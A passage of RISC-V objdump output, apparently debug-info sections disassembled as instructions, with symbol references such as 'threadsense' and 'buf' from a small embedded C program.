     a24:	4101                	.2byte	0x4101
     a26:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     a2a:	4312                	.2byte	0x4312
     a2c:	008d                	.2byte	0x8d
     a2e:	0000                	.2byte	0x0
     a30:	7ee89103          	lh	sp,2030(a7)
     a34:	e401                	.2byte	0xe401
     a36:	0001                	.2byte	0x1
     a38:	0200                	.2byte	0x200
     a3a:	5212                	.2byte	0x5212
     a3c:	008d                	.2byte	0x8d
     a3e:	0000                	.2byte	0x0
     a40:	7ee09103          	lh	sp,2030(ra)
     a44:	0002a22b          	.4byte	0x2a22b
     a48:	0200                	.2byte	0x200
     a4a:	1514                	.2byte	0x1514
     a4c:	098e                	.2byte	0x98e
     a4e:	0000                	.2byte	0x0
     a50:	0240                	.2byte	0x240
     a52:	007f 1200 0099 0000 	.byte	0x7f, 0x00, 0x00, 0x12, 0x99, 0x00, 0x00, 0x00, 0x8e, 0x09
     a5a:	098e 
     a5c:	0000                	.2byte	0x0
     a5e:	00007a13          	and	s4,zero,0
     a62:	0700                	.2byte	0x700
     a64:	0e00                	.2byte	0xe00
     a66:	097e                	.2byte	0x97e
     a68:	0000                	.2byte	0x0
     a6a:	d30a                	.2byte	0xd30a
     a6c:	0002                	.2byte	0x2
     a6e:	0100                	.2byte	0x100
     a70:	1178                	.2byte	0x1178
     a72:	008d                	.2byte	0x8d
     a74:	0000                	.2byte	0x0
     a76:	14ec                	.2byte	0x14ec
     a78:	8000                	.2byte	0x8000
     a7a:	0000                	.2byte	0x0
     a7c:	0000                	.2byte	0x0
     a7e:	004c                	.2byte	0x4c
     a80:	0000                	.2byte	0x0
     a82:	0000                	.2byte	0x0
     a84:	0000                	.2byte	0x0
     a86:	9c01                	.2byte	0x9c01
     a88:	09d2                	.2byte	0x9d2
     a8a:	0000                	.2byte	0x0
     a8c:	01007803          	.4byte	0x1007803
     a90:	2178                	.2byte	0x2178
     a92:	008d                	.2byte	0x8d
     a94:	0000                	.2byte	0x0
     a96:	9102                	.2byte	0x9102
     a98:	0858                	.2byte	0x858
     a9a:	0205                	.2byte	0x205
     a9c:	0000                	.2byte	0x0
     a9e:	7a01                	.2byte	0x7a01
     aa0:	8d0c                	.2byte	0x8d0c
     aa2:	0000                	.2byte	0x0
     aa4:	0200                	.2byte	0x200
     aa6:	6891                	.2byte	0x6891
     aa8:	0a00                	.2byte	0xa00
     aaa:	0354                	.2byte	0x354
     aac:	0000                	.2byte	0x0
     aae:	7201                	.2byte	0x7201
     ab0:	8d11                	.2byte	0x8d11
     ab2:	0000                	.2byte	0x0
     ab4:	a000                	.2byte	0xa000
     ab6:	0014                	.2byte	0x14
     ab8:	0080                	.2byte	0x80
     aba:	0000                	.2byte	0x0
     abc:	4c00                	.2byte	0x4c00
     abe:	0000                	.2byte	0x0
     ac0:	0000                	.2byte	0x0
     ac2:	0000                	.2byte	0x0
     ac4:	0100                	.2byte	0x100
     ac6:	119c                	.2byte	0x119c
     ac8:	000a                	.2byte	0xa
     aca:	0300                	.2byte	0x300
     acc:	0078                	.2byte	0x78
     ace:	7201                	.2byte	0x7201
     ad0:	8d1f 0000 0200      	.byte	0x1f, 0x8d, 0x00, 0x00, 0x00, 0x02
     ad6:	5891                	.2byte	0x5891
     ad8:	6202                	.2byte	0x6202
     ada:	7469                	.2byte	0x7469
     adc:	0100                	.2byte	0x100
     ade:	0c74                	.2byte	0xc74
     ae0:	008d                	.2byte	0x8d
     ae2:	0000                	.2byte	0x0
     ae4:	9102                	.2byte	0x9102
     ae6:	0068                	.2byte	0x68
     ae8:	dc1d                	.2byte	0xdc1d
     aea:	0001                	.2byte	0x1
     aec:	5e00                	.2byte	0x5e00
     aee:	0013f827          	.4byte	0x13f827
     af2:	0080                	.2byte	0x80
     af4:	0000                	.2byte	0x0
     af6:	a800                	.2byte	0xa800
     af8:	0000                	.2byte	0x0
     afa:	0000                	.2byte	0x0
     afc:	0000                	.2byte	0x0
     afe:	0100                	.2byte	0x100
     b00:	759c                	.2byte	0x759c
     b02:	000a                	.2byte	0xa
     b04:	0100                	.2byte	0x100
     b06:	02f8                	.2byte	0x2f8
     b08:	0000                	.2byte	0x0
     b0a:	5e01                	.2byte	0x5e01
     b0c:	00004a33          	xor	s4,zero,zero
     b10:	0200                	.2byte	0x200
     b12:	6c91                	.2byte	0x6c91
     b14:	2d08                	.2byte	0x2d08
     b16:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
     b1a:	1760                	.2byte	0x1760
     b1c:	0051                	.2byte	0x51
     b1e:	0000                	.2byte	0x0
     b20:	0309                	.2byte	0x309
     b22:	2b84                	.2byte	0x2b84
     b24:	8000                	.2byte	0x8000
     b26:	0000                	.2byte	0x0
     b28:	0000                	.2byte	0x0
     b2a:	0908                	.2byte	0x908
     b2c:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
     b30:	1761                	.2byte	0x1761
     b32:	0051                	.2byte	0x51
     b34:	0000                	.2byte	0x0
     b36:	0309                	.2byte	0x309
     b38:	2b80                	.2byte	0x2b80
     b3a:	8000                	.2byte	0x8000
     b3c:	0000                	.2byte	0x0
     b3e:	0000                	.2byte	0x0
     b40:	271c                	.2byte	0x271c
     b42:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
     b46:	4a62                	.2byte	0x4a62
     b48:	0000                	.2byte	0x0
     b4a:	0000                	.2byte	0x0
     b4c:	510a                	.2byte	0x510a
     b4e:	0002                	.2byte	0x2
     b50:	0100                	.2byte	0x100
     b52:	0c4e                	.2byte	0xc4e
     b54:	004a                	.2byte	0x4a
     b56:	0000                	.2byte	0x0
     b58:	1270                	.2byte	0x1270
     b5a:	8000                	.2byte	0x8000
     b5c:	0000                	.2byte	0x0
     b5e:	0000                	.2byte	0x0
     b60:	0188                	.2byte	0x188
     b62:	0000                	.2byte	0x0
     b64:	0000                	.2byte	0x0
     b66:	0000                	.2byte	0x0
     b68:	9c01                	.2byte	0x9c01
     b6a:	00000b3b          	addw	s6,zero,zero
     b6e:	01006e03          	lwu	t3,16(zero) # 10 <threadsense.5+0x10>
     b72:	1d4e                	.2byte	0x1d4e
     b74:	004a                	.2byte	0x4a
     b76:	0000                	.2byte	0x0
     b78:	7fbc9103          	lh	sp,2043(s9)
     b7c:	8401                	.2byte	0x8401
     b7e:	0002                	.2byte	0x2
     b80:	0100                	.2byte	0x100
     b82:	374e                	.2byte	0x374e
     b84:	00000b3b          	addw	s6,zero,zero
     b88:	7fb09103          	lh	sp,2043(ra)
     b8c:	5901                	.2byte	0x5901
     b8e:	0001                	.2byte	0x1
     b90:	0100                	.2byte	0x100
     b92:	4b4e                	.2byte	0x4b4e
     b94:	0b51                	.2byte	0xb51
     b96:	0000                	.2byte	0x0
     b98:	7fa89103          	lh	sp,2042(a7)
     b9c:	6902                	.2byte	0x6902
     b9e:	0100                	.2byte	0x100
     ba0:	0750                	.2byte	0x750
     ba2:	004a                	.2byte	0x4a
     ba4:	0000                	.2byte	0x0
     ba6:	9102                	.2byte	0x9102
     ba8:	106c                	.2byte	0x106c
     baa:	1294                	.2byte	0x1294
     bac:	8000                	.2byte	0x8000
     bae:	0000                	.2byte	0x0
     bb0:	0000                	.2byte	0x0
     bb2:	00cc                	.2byte	0xcc
     bb4:	0000                	.2byte	0x0
     bb6:	0000                	.2byte	0x0
     bb8:	0000                	.2byte	0x0
     bba:	7402                	.2byte	0x7402
     bbc:	0030                	.2byte	0x30
     bbe:	5401                	.2byte	0x5401
     bc0:	400c                	.2byte	0x400c
     bc2:	0200000b          	.4byte	0x200000b
     bc6:	6091                	.2byte	0x6091
     bc8:	7402                	.2byte	0x7402
     bca:	0031                	.2byte	0x31
     bcc:	5401                	.2byte	0x5401
     bce:	401a                	.2byte	0x401a
     bd0:	0200000b          	.4byte	0x200000b
     bd4:	5891                	.2byte	0x5891
     bd6:	7602                	.2byte	0x7602
     bd8:	0030                	.2byte	0x30
     bda:	5501                	.2byte	0x5501
     bdc:	400c                	.2byte	0x400c
     bde:	0200000b          	.4byte	0x200000b
     be2:	5091                	.2byte	0x5091
     be4:	7602                	.2byte	0x7602
     be6:	0031                	.2byte	0x31
     be8:	5501                	.2byte	0x5501
     bea:	401c                	.2byte	0x401c
     bec:	0200000b          	.4byte	0x200000b
     bf0:	4891                	.2byte	0x4891
     bf2:	6502                	.2byte	0x6502
     bf4:	3171                	.2byte	0x3171
     bf6:	0100                	.2byte	0x100
     bf8:	0956                	.2byte	0x956
     bfa:	004a                	.2byte	0x4a
     bfc:	0000                	.2byte	0x0
     bfe:	9102                	.2byte	0x9102
     c00:	0244                	.2byte	0x244
     c02:	7165                	.2byte	0x7165
     c04:	0032                	.2byte	0x32
     c06:	5601                	.2byte	0x5601
     c08:	4a19                	.2byte	0x4a19
     c0a:	0000                	.2byte	0x0
     c0c:	0200                	.2byte	0x200
     c0e:	4091                	.2byte	0x4091
     c10:	0000                	.2byte	0x0
     c12:	4c06                	.2byte	0x4c06
     c14:	0700000b          	.4byte	0x700000b
     c18:	0408                	.2byte	0x408
     c1a:	0346                	.2byte	0x346
     c1c:	0000                	.2byte	0x0
     c1e:	400c                	.2byte	0x400c
     c20:	0e00000b          	.4byte	0xe00000b
     c24:	00000b47          	fmsub.s	fs6,ft0,ft0,ft0,rne
     c28:	4706                	.2byte	0x4706
     c2a:	0a00000b          	.4byte	0xa00000b
     c2e:	0159                	.2byte	0x159
     c30:	0000                	.2byte	0x0
     c32:	3e01                	.2byte	0x3e01
     c34:	4a0c                	.2byte	0x4a0c
     c36:	0000                	.2byte	0x0
     c38:	f800                	.2byte	0xf800
     c3a:	0010                	.2byte	0x10
     c3c:	0080                	.2byte	0x80
     c3e:	0000                	.2byte	0x0
     c40:	7800                	.2byte	0x7800
     c42:	0001                	.2byte	0x1
     c44:	0000                	.2byte	0x0
     c46:	0000                	.2byte	0x0
     c48:	0100                	.2byte	0x100
     c4a:	fc9c                	.2byte	0xfc9c
     c4c:	0300000b          	.4byte	0x300000b
     c50:	006e                	.2byte	0x6e
     c52:	3e01                	.2byte	0x3e01
     c54:	00004a17          	auipc	s4,0x4
     c58:	0200                	.2byte	0x200
     c5a:	4c91                	.2byte	0x4c91
     c5c:	8401                	.2byte	0x8401
     c5e:	0002                	.2byte	0x2
     c60:	0100                	.2byte	0x100
     c62:	2e3e                	.2byte	0x2e3e
     c64:	0bfc                	.2byte	0xbfc
     c66:	0000                	.2byte	0x0
     c68:	9102                	.2byte	0x9102
     c6a:	0140                	.2byte	0x140
     c6c:	0159                	.2byte	0x159
     c6e:	0000                	.2byte	0x0
     c70:	3e01                	.2byte	0x3e01
     c72:	000c013f b8910300 	.8byte	0xb8910300000c013f
     c7a:	027f 0069 4001 4a07 	.byte	0x7f, 0x02, 0x69, 0x00, 0x01, 0x40, 0x07, 0x4a, 0x00, 0x00
     c82:	0000 
     c84:	0200                	.2byte	0x200
     c86:	6c91                	.2byte	0x6c91
     c88:	1c10                	.2byte	0x1c10
     c8a:	0011                	.2byte	0x11
     c8c:	0080                	.2byte	0x80
     c8e:	0000                	.2byte	0x0
     c90:	b800                	.2byte	0xb800
     c92:	0000                	.2byte	0x0
     c94:	0000                	.2byte	0x0
     c96:	0000                	.2byte	0x0
     c98:	0200                	.2byte	0x200
     c9a:	3074                	.2byte	0x3074
     c9c:	0100                	.2byte	0x100
     c9e:	0944                	.2byte	0x944
     ca0:	004a                	.2byte	0x4a
     ca2:	0000                	.2byte	0x0
     ca4:	9102                	.2byte	0x9102
     ca6:	0268                	.2byte	0x268
     ca8:	3174                	.2byte	0x3174
     caa:	0100                	.2byte	0x100
     cac:	1744                	.2byte	0x1744
     cae:	004a                	.2byte	0x4a
     cb0:	0000                	.2byte	0x0
     cb2:	9102                	.2byte	0x9102
     cb4:	0264                	.2byte	0x264
     cb6:	3076                	.2byte	0x3076
     cb8:	0100                	.2byte	0x100
     cba:	0945                	.2byte	0x945
     cbc:	004a                	.2byte	0x4a
     cbe:	0000                	.2byte	0x0
     cc0:	9102                	.2byte	0x9102
     cc2:	0260                	.2byte	0x260
     cc4:	3176                	.2byte	0x3176
     cc6:	0100                	.2byte	0x100
     cc8:	1945                	.2byte	0x1945
     cca:	004a                	.2byte	0x4a
     ccc:	0000                	.2byte	0x0
     cce:	9102                	.2byte	0x9102
     cd0:	005c                	.2byte	0x5c
     cd2:	0600                	.2byte	0x600
     cd4:	0056                	.2byte	0x56
     cd6:	0000                	.2byte	0x0
     cd8:	5b06                	.2byte	0x5b06
     cda:	0000                	.2byte	0x0
     cdc:	1d00                	.2byte	0x1d00
     cde:	01b0                	.2byte	0x1b0
     ce0:	0000                	.2byte	0x0
     ce2:	10cc0d33          	.4byte	0x10cc0d33
     ce6:	8000                	.2byte	0x8000
     ce8:	0000                	.2byte	0x0
     cea:	0000                	.2byte	0x0
     cec:	002c                	.2byte	0x2c
     cee:	0000                	.2byte	0x0
     cf0:	0000                	.2byte	0x0
     cf2:	0000                	.2byte	0x0
     cf4:	9c01                	.2byte	0x9c01
     cf6:	00000c4f          	fnmadd.s	fs8,ft0,ft0,ft0,rne
     cfa:	3901                	.2byte	0x3901
     cfc:	0002                	.2byte	0x2
     cfe:	0100                	.2byte	0x100
     d00:	00db2933          	slt	s2,s6,a3
     d04:	0000                	.2byte	0x0
     d06:	9102                	.2byte	0x9102
     d08:	0368                	.2byte	0x368
     d0a:	006e                	.2byte	0x6e
     d0c:	3301                	.2byte	0x3301
     d0e:	4a35                	.2byte	0x4a35
     d10:	0000                	.2byte	0x0
     d12:	0200                	.2byte	0x200
     d14:	6491                	.2byte	0x6491
     d16:	72726103          	lwu	sp,1831(tp) # 727 <threadsense.2+0x6a3>
     d1a:	0100                	.2byte	0x100
     d1c:	0b514533          	.4byte	0xb514533
     d20:	0000                	.2byte	0x0
     d22:	9102                	.2byte	0x9102
     d24:	0058                	.2byte	0x58
     d26:	d12c                	.2byte	0xd12c
     d28:	0001                	.2byte	0x1
     d2a:	0100                	.2byte	0x100
     d2c:	0d28                	.2byte	0xd28
     d2e:	10a0                	.2byte	0x10a0
     d30:	8000                	.2byte	0x8000
     d32:	0000                	.2byte	0x0
     d34:	0000                	.2byte	0x0
     d36:	002c                	.2byte	0x2c
     d38:	0000                	.2byte	0x0
     d3a:	0000                	.2byte	0x0
     d3c:	0000                	.2byte	0x0
     d3e:	9c01                	.2byte	0x9c01
     d40:	3901                	.2byte	0x3901
     d42:	0002                	.2byte	0x2
     d44:	0100                	.2byte	0x100
     d46:	2328                	.2byte	0x2328
     d48:	000000db          	.4byte	0xdb
     d4c:	9102                	.2byte	0x9102
     d4e:	0368                	.2byte	0x368
     d50:	006e                	.2byte	0x6e
     d52:	2801                	.2byte	0x2801
     d54:	00004a2f          	.4byte	0x4a2f
     d58:	0200                	.2byte	0x200
     d5a:	6491                	.2byte	0x6491
     d5c:	72726103          	lwu	sp,1831(tp) # 727 <threadsense.2+0x6a3>
     d60:	0100                	.2byte	0x100
     d62:	3c28                	.2byte	0x3c28
     d64:	0c01                	.2byte	0xc01
     d66:	0000                	.2byte	0x0
     d68:	9102                	.2byte	0x9102
     d6a:	0058                	.2byte	0x58
     d6c:	7e00                	.2byte	0x7e00
     d6e:	0001                	.2byte	0x1
     d70:	0500                	.2byte	0x500
     d72:	0100                	.2byte	0x100
     d74:	6408                	.2byte	0x6408
     d76:	05000003          	lb	zero,80(zero) # 50 <buf.4+0x10>
     d7a:	0079                	.2byte	0x79
     d7c:	0000                	.2byte	0x0
     d7e:	9b0c                	.2byte	0x9b0c
     d80:	0001                	.2byte	0x1
     d82:	0000                	.2byte	0x0
     d84:	0000                	.2byte	0x0
     d86:	0c00                	.2byte	0xc00
     d88:	0025                	.2byte	0x25
     d8a:	0080                	.2byte	0x80
     d8c:	0000                	.2byte	0x0
     d8e:	8000                	.2byte	0x8000
     d90:	0001                	.2byte	0x1
     d92:	0000                	.2byte	0x0
     d94:	0000                	.2byte	0x0
     d96:	f500                	.2byte	0xf500
     d98:	0011                	.2byte	0x11
     d9a:	0100                	.2byte	0x100
     d9c:	0601                	.2byte	0x601
     d9e:	00000123          	sb	zero,2(zero) # 2 <threadsense.5+0x2>
     da2:	7a02                	.2byte	0x7a02
     da4:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     da8:	0041182b          	.4byte	0x41182b
     dac:	0000                	.2byte	0x0
     dae:	0101                	.2byte	0x101
     db0:	2108                	.2byte	0x2108
     db2:	0001                	.2byte	0x1
     db4:	0100                	.2byte	0x100
     db6:	0502                	.2byte	0x502
     db8:	00000117          	auipc	sp,0x0
     dbc:	0201                	.2byte	0x201
     dbe:	00006607          	.4byte	0x6607
     dc2:	0600                	.2byte	0x600
     dc4:	0504                	.2byte	0x504
     dc6:	6e69                	.2byte	0x6e69
     dc8:	0074                	.2byte	0x74
     dca:	0401                	.2byte	0x401
     dcc:	00027707          	.4byte	0x27707
     dd0:	0100                	.2byte	0x100
     dd2:	0508                	.2byte	0x508
     dd4:	01fc                	.2byte	0x1fc
     dd6:	0000                	.2byte	0x0
     dd8:	c302                	.2byte	0xc302
     dda:	0002                	.2byte	0x2
     ddc:	0200                	.2byte	0x200
     dde:	1969                	.2byte	0x1969
     de0:	00000077          	.4byte	0x77
     de4:	0801                	.2byte	0x801
     de6:	00027207          	.4byte	0x27207
     dea:	0200                	.2byte	0x200
     dec:	005a                	.2byte	0x5a
     dee:	0000                	.2byte	0x0
     df0:	e802                	.2byte	0xe802
     df2:	771a                	.2byte	0x771a
     df4:	0000                	.2byte	0x0
     df6:	0200                	.2byte	0x200
     df8:	037c                	.2byte	0x37c
     dfa:	0000                	.2byte	0x0
     dfc:	35131803          	lh	a6,849(t1) # 33ae7 <threadsense.2+0x33a63>
     e00:	0000                	.2byte	0x0
     e02:	0200                	.2byte	0x200
     e04:	02c5                	.2byte	0x2c5
     e06:	0000                	.2byte	0x0
     e08:	6b143c03          	ld	s8,1713(s0)
     e0c:	0000                	.2byte	0x0
     e0e:	0200                	.2byte	0x200
     e10:	005c                	.2byte	0x5c
     e12:	0000                	.2byte	0x0
     e14:	7e155203          	lhu	tp,2017(a0)
     e18:	0000                	.2byte	0x0
     e1a:	0200                	.2byte	0x200
     e1c:	039d                	.2byte	0x39d
     e1e:	0000                	.2byte	0x0
     e20:	1804                	.2byte	0x1804
     e22:	00007717          	auipc	a4,0x7
     e26:	0300                	.2byte	0x300
     e28:	008a                	.2byte	0x8a
     e2a:	0000                	.2byte	0x0
     e2c:	00c5                	.2byte	0xc5
     e2e:	0000                	.2byte	0x0
     e30:	96080007          	.4byte	0x96080007
     e34:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
     e38:	101e                	.2byte	0x101e
     e3a:	00ba                	.2byte	0xba
     e3c:	0000                	.2byte	0x0
     e3e:	0000ae03          	lw	t3,0(ra)
     e42:	e800                	.2byte	0xe800
     e44:	0000                	.2byte	0x0
     e46:	0900                	.2byte	0x900
     e48:	00000077          	.4byte	0x77
     e4c:	0a02                	.2byte	0xa02
     e4e:	00000077          	.4byte	0x77
     e52:	01ff 0b00 7470 0100 	.byte	0xff, 0x01, 0x00, 0x0b, 0x70, 0x74, 0x00, 0x01, 0x22, 0x07
     e5a:	0722 
     e5c:	00d1                	.2byte	0xd1
     e5e:	0000                	.2byte	0x0
     e60:	1000                	.2byte	0x1000
     e62:	0309                	.2byte	0x309
     e64:	3000                	.2byte	0x3000
     e66:	8000                	.2byte	0x8000
     e68:	0000                	.2byte	0x0
     e6a:	0000                	.2byte	0x0
     e6c:	8f0c                	.2byte	0x8f0c
     e6e:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
     e72:	0d20                	.2byte	0xd20
     e74:	010d                	.2byte	0x10d
     e76:	0000                	.2byte	0x0
     e78:	000d                	.2byte	0xd
     e7a:	720e                	.2byte	0x720e
     e7c:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
     e80:	0629                	.2byte	0x629
     e82:	2558                	.2byte	0x2558
     e84:	8000                	.2byte	0x8000
     e86:	0000                	.2byte	0x0
     e88:	0000                	.2byte	0x0
     e8a:	0134                	.2byte	0x134
     e8c:	0000                	.2byte	0x0
     e8e:	0000                	.2byte	0x0
     e90:	0000                	.2byte	0x0
     e92:	9c01                	.2byte	0x9c01
     e94:	0146                	.2byte	0x146
     e96:	0000                	.2byte	0x0
     e98:	aa04                	.2byte	0xaa04
     e9a:	3b000003          	lb	zero,944(zero) # 3b0 <threadsense.2+0x32c>
     e9e:	00a2                	.2byte	0xa2
     ea0:	0000                	.2byte	0x0
     ea2:	9102                	.2byte	0x9102
     ea4:	0468                	.2byte	0x468
     ea6:	0384                	.2byte	0x384
     ea8:	0000                	.2byte	0x0
     eaa:	a23c                	.2byte	0xa23c
     eac:	0000                	.2byte	0x0
     eae:	0200                	.2byte	0x200
     eb0:	6091                	.2byte	0x6091
     eb2:	0f00                	.2byte	0xf00
     eb4:	000003a3          	sb	zero,7(zero) # 7 <threadsense.5+0x7>
     eb8:	2401                	.2byte	0x2401
     eba:	9611                	.2byte	0x9611
     ebc:	0000                	.2byte	0x0
     ebe:	0c00                	.2byte	0xc00
     ec0:	0025                	.2byte	0x25
     ec2:	0080                	.2byte	0x80
     ec4:	0000                	.2byte	0x0
     ec6:	4c00                	.2byte	0x4c00
     ec8:	0000                	.2byte	0x0
     eca:	0000                	.2byte	0x0
     ecc:	0000                	.2byte	0x0
     ece:	0100                	.2byte	0x100
     ed0:	109c                	.2byte	0x109c
     ed2:	0078                	.2byte	0x78
     ed4:	2401                	.2byte	0x2401
     ed6:	9621                	.2byte	0x9621
     ed8:	0000                	.2byte	0x0
     eda:	0200                	.2byte	0x200
     edc:	5891                	.2byte	0x5891
     ede:	6211                	.2byte	0x6211
     ee0:	7469                	.2byte	0x7469
     ee2:	0100                	.2byte	0x100
     ee4:	0e25                	.2byte	0xe25
     ee6:	0096                	.2byte	0x96
     ee8:	0000                	.2byte	0x0
     eea:	9102                	.2byte	0x9102
     eec:	0068                	.2byte	0x68
     eee:	6d00                	.2byte	0x6d00
     ef0:	0006                	.2byte	0x6
     ef2:	0500                	.2byte	0x500
     ef4:	0100                	.2byte	0x100
     ef6:	6508                	.2byte	0x6508
     ef8:	0004                	.2byte	0x4
     efa:	1000                	.2byte	0x1000
     efc:	0079                	.2byte	0x79
     efe:	0000                	.2byte	0x0
     f00:	a90c                	.2byte	0xa90c
     f02:	0001                	.2byte	0x1
     f04:	0000                	.2byte	0x0
     f06:	0000                	.2byte	0x0
     f08:	2e00                	.2byte	0x2e00
	...
     f12:	0000                	.2byte	0x0
     f14:	5e00                	.2byte	0x5e00
     f16:	03000013          	li	zero,48
     f1a:	0601                	.2byte	0x601
     f1c:	00000123          	sb	zero,2(zero) # 2 <threadsense.5+0x2>
     f20:	7a08                	.2byte	0x7a08
     f22:	03000003          	lb	zero,48(zero) # 30 <threadsense.5+0x30>
     f26:	003d182b          	.4byte	0x3d182b
     f2a:	0000                	.2byte	0x0
     f2c:	21080103          	lb	sp,528(a6)
     f30:	0001                	.2byte	0x1
     f32:	0300                	.2byte	0x300
     f34:	0502                	.2byte	0x502
     f36:	00000117          	auipc	sp,0x0
     f3a:	66070203          	lb	tp,1632(a4) # 8482 <threadsense.2+0x83fe>
     f3e:	0000                	.2byte	0x0
     f40:	1100                	.2byte	0x1100
     f42:	0504                	.2byte	0x504
     f44:	6e69                	.2byte	0x6e69
     f46:	0074                	.2byte	0x74
     f48:	520c                	.2byte	0x520c
     f4a:	0000                	.2byte	0x0
     f4c:	0900                	.2byte	0x900
     f4e:	0059                	.2byte	0x59
     f50:	0000                	.2byte	0x0
     f52:	5209                	.2byte	0x5209
     f54:	0000                	.2byte	0x0
     f56:	0300                	.2byte	0x300
     f58:	0704                	.2byte	0x704
     f5a:	00000277          	.4byte	0x277
     f5e:	fc050803          	lb	a6,-64(a0)
     f62:	0001                	.2byte	0x1
     f64:	0800                	.2byte	0x800
     f66:	000002c3          	fmadd.s	ft5,ft0,ft0,ft0,rne
     f6a:	82196903          	lwu	s2,-2015(s2)
     f6e:	0000                	.2byte	0x0
     f70:	0300                	.2byte	0x300
     f72:	0708                	.2byte	0x708
     f74:	0272                	.2byte	0x272
     f76:	0000                	.2byte	0x0
     f78:	f7050803          	lb	a6,-144(a0)
     f7c:	0001                	.2byte	0x1
     f7e:	0300                	.2byte	0x300
     f80:	0801                	.2byte	0x801
     f82:	012a                	.2byte	0x12a
     f84:	0000                	.2byte	0x0
     f86:	9009                	.2byte	0x9009
     f88:	0000                	.2byte	0x0
     f8a:	0600                	.2byte	0x600
     f8c:	00000097          	auipc	ra,0x0
     f90:	9c12                	.2byte	0x9c12
     f92:	0000                	.2byte	0x0
     f94:	0300                	.2byte	0x300
     f96:	0708                	.2byte	0x708
     f98:	026d                	.2byte	0x26d
     f9a:	0000                	.2byte	0x0
     f9c:	7c08                	.2byte	0x7c08
     f9e:	04000003          	lb	zero,64(zero) # 40 <buf.4>
     fa2:	1318                	.2byte	0x1318
     fa4:	0031                	.2byte	0x31
     fa6:	0000                	.2byte	0x0
     fa8:	c508                	.2byte	0xc508
     faa:	0002                	.2byte	0x2
     fac:	0400                	.2byte	0x400
     fae:	143c                	.2byte	0x143c
     fb0:	0076                	.2byte	0x76
     fb2:	0000                	.2byte	0x0
     fb4:	b90c                	.2byte	0xb90c
     fb6:	0000                	.2byte	0x0
     fb8:	0a00                	.2byte	0xa00
     fba:	00ad                	.2byte	0xad
     fbc:	0000                	.2byte	0x0
     fbe:	00d5                	.2byte	0xd5
     fc0:	0000                	.2byte	0x0
     fc2:	96140013          	add	zero,s0,-1695
     fc6:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     fca:	1010                	.2byte	0x1010
     fcc:	00ca                	.2byte	0xca
     fce:	0000                	.2byte	0x0
     fd0:	ad0a                	.2byte	0xad0a
     fd2:	0000                	.2byte	0x0
     fd4:	f100                	.2byte	0xf100
     fd6:	0000                	.2byte	0x0
     fd8:	0d00                	.2byte	0xd00
     fda:	0082                	.2byte	0x82
     fdc:	0000                	.2byte	0x0
     fde:	0008                	.2byte	0x8
     fe0:	ea15                	.2byte	0xea15
     fe2:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
     fe6:	0911                	.2byte	0x911
     fe8:	00e1                	.2byte	0xe1
     fea:	0000                	.2byte	0x0
     fec:	0309                	.2byte	0x309
     fee:	2b40                	.2byte	0x2b40
     ff0:	8000                	.2byte	0x8000
     ff2:	0000                	.2byte	0x0
     ff4:	0000                	.2byte	0x0
     ff6:	1016                	.2byte	0x1016
     ff8:	0001                	.2byte	0x1
     ffa:	0500                	.2byte	0x500
     ffc:	05c8                	.2byte	0x5c8
     ffe:	0052                	.2byte	0x52
    1000:	0000                	.2byte	0x0
    1002:	011e                	.2byte	0x11e
    1004:	0000                	.2byte	0x0
    1006:	0000a117          	auipc	sp,0xa
    100a:	1800                	.2byte	0x1800
    100c:	0e00                	.2byte	0xe00
    100e:	00000413          	li	s0,0
    1012:	0552                	.2byte	0x552
    1014:	0052                	.2byte	0x52
    1016:	0000                	.2byte	0x0
    1018:	016c                	.2byte	0x16c
    101a:	8020                	.2byte	0x8020
    101c:	0000                	.2byte	0x0
    101e:	0000                	.2byte	0x0
    1020:	02bc                	.2byte	0x2bc
    1022:	0000                	.2byte	0x0
    1024:	0000                	.2byte	0x0
    1026:	0000                	.2byte	0x0
    1028:	9c01                	.2byte	0x9c01
    102a:	0270                	.2byte	0x270
    102c:	0000                	.2byte	0x0
    102e:	7301                	.2byte	0x7301
    1030:	6365                	.2byte	0x6365
    1032:	0200                	.2byte	0x200
    1034:	00b90e53          	fadd.s	ft8,fs2,fa1,rne
    1038:	0000                	.2byte	0x0
    103a:	9102                	.2byte	0x9102
    103c:	0250                	.2byte	0x250
    103e:	0205                	.2byte	0x205
    1040:	0000                	.2byte	0x0
    1042:	5402                	.2byte	0x5402
    1044:	700d                	.2byte	0x700d
    1046:	0002                	.2byte	0x2
    1048:	0300                	.2byte	0x300
    104a:	8891                	.2byte	0x8891
    104c:	027f 03d0 0000 5502 	.byte	0x7f, 0x02, 0xd0, 0x03, 0x00, 0x00, 0x02, 0x55, 0x0d, 0x70
    1054:	700d 
    1056:	0002                	.2byte	0x2
    1058:	0300                	.2byte	0x300
    105a:	e891                	.2byte	0xe891
    105c:	027e                	.2byte	0x27e
    105e:	040d                	.2byte	0x40d
    1060:	0000                	.2byte	0x0
    1062:	5702                	.2byte	0x5702
    1064:	b90e                	.2byte	0xb90e
    1066:	0000                	.2byte	0x0
    1068:	0300                	.2byte	0x300
    106a:	b091                	.2byte	0xb091
    106c:	017f 6e65 0064 5702 	.byte	0x7f, 0x01, 0x65, 0x6e, 0x64, 0x00, 0x02, 0x57, 0x15, 0xb9
    1074:	b915 
    1076:	0000                	.2byte	0x0
    1078:	0300                	.2byte	0x300
    107a:	a891                	.2byte	0xa891
    107c:	027f 03c3 0000 7e02 	.byte	0x7f, 0x02, 0xc3, 0x03, 0x00, 0x00, 0x02, 0x7e, 0x0e, 0x80
    1084:	800e 
    1086:	0002                	.2byte	0x2
    1088:	0200                	.2byte	0x200
    108a:	4891                	.2byte	0x4891
    108c:	dd02                	.2byte	0xdd02
    108e:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
    1092:	0e7f 0280 0000 9102 	.byte	0x7f, 0x0e, 0x80, 0x02, 0x00, 0x00, 0x02, 0x91, 0x40, 0x02
    109a:	0240 
    109c:	0284                	.2byte	0x284
    109e:	0000                	.2byte	0x0
    10a0:	8002                	.2byte	0x8002
    10a2:	ad0d                	.2byte	0xad0d
    10a4:	0000                	.2byte	0x0
    10a6:	0300                	.2byte	0x300
